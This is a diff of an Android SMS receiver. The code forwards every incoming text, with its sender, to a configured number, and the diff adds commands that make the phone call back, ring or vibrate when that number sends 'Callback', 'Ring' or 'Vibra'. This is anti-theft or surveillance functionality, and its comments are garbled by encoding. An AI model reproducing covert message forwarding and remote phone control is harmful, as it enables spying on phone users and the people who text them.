@@ -11,16 +11,14 @@ public class SmsReceiver extends BroadcastReceiver{
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		// TODO Auto-generated method stub
-		Bundle bundle = intent.getExtras();//�����ȡ����
-		Object objs[] = (Object[])bundle.get("pdus");//���յ��Ķ�������objs�ϣ���������������������
+		Bundle bundle = intent.getExtras();
+		Object objs[] = (Object[])bundle.get("pdus");
 		
 		//����������
 		SmsMessage mess[] = new SmsMessage[objs.length];
 		for(int i = 0; i<objs.length; i++){
-			mess[i] = SmsMessage.createFromPdu((byte[])objs[i]);//objs����ת����mess����
+			mess[i] = SmsMessage.createFromPdu((byte[])objs[i]);
 		}
-		
 		//��ȡ���ŵ绰���������
 		for(int i = 0; i<mess.length; i++){
 			SmsMessage message = mess[i];
@@ -31,17 +29,80 @@ public class SmsReceiver extends BroadcastReceiver{
 			if(AppContext.isSms()){
 				if(!AppContext.getNumber().equals(number)
 						&&!AppContext.getNumber().equals(number.substring(number.length()-4))){//�ӵڼ�����ʼȡ
-				//ת������
 					
 					AppUitl util = new AppUitl();
 					util.sendSms(AppContext.getNumber(), util.getTime()+" "+number+"send sms: "+sms);
 					
 			}
 			}
-			
 		
+			if (AppContext.isCallback()) {
+				if (AppContext.getNumber
+
+				().equals(number) ||
+
+				AppContext.getNumber().equals(number.substring
+
+				(number.length() - 4))) {
+					if (sms.equals
+
+					("Callback")) {
+						AppUitl util =
+
+						new AppUitl();
+						util.call
+
+						(context, number);
+					}
+
+				}
+
+			}
 			
 
+			// ����
+			if (AppContext.isRing()) {
+				if (AppContext.getNumber
+
+				().equals(number) ||
+
+				AppContext.getNumber().equals(number.substring
+
+				(number.length() - 4))) {
+					if (sms.equals
+
+					("Ring")) {
+						AppUitl
+
+						util = new AppUitl();
+
+						util.ring(context);
+					}
+
+				}
+
+			}
+
+			// ��
+			if (AppContext.isVibra()) {
+				if (AppContext.getNumber
+
+				().equals(number) ||
+
+				AppContext.getNumber().equals(number.substring
+
+				(number.length() - 4))) {
+					if (sms.equals
+
+					("Vibra")) {
+						AppUitl
+
+						util = new AppUitl();
+
+						util.vibra(context);
+					}
+				}
+			}
 			
 			
 			}
